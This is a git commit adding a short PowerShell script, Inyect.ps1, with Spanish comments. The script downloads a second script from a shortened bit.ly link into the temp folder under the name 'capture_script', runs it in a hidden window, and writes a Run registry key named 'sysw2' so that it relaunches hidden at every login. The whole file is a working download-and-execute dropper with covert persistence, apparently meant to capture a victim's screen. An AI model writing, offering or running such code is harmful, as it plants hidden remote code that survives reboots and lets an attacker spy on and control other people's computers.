feb4a17b9c0d3ff775a076db4f9d4117d17c889a
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-10 21:48:33 -0500

    Add files via upload

---
+++ Inyect.ps1
@@ -0,0 +1,9 @@
+# Descargar y ejecutar el script desde el enlace proporcionado
+$scriptUrl = "https://bit.ly/Screen_dc"
+$scriptPath = "$env:temp\capture_script.ps1"
+Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File $scriptPath"
+
+# Agregar entrada al registro de usuario actual para iniciar con el sistema de forma oculta
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "sysw2" -Value "powershell.exe -WindowStyle Hidden -File $scriptPath"
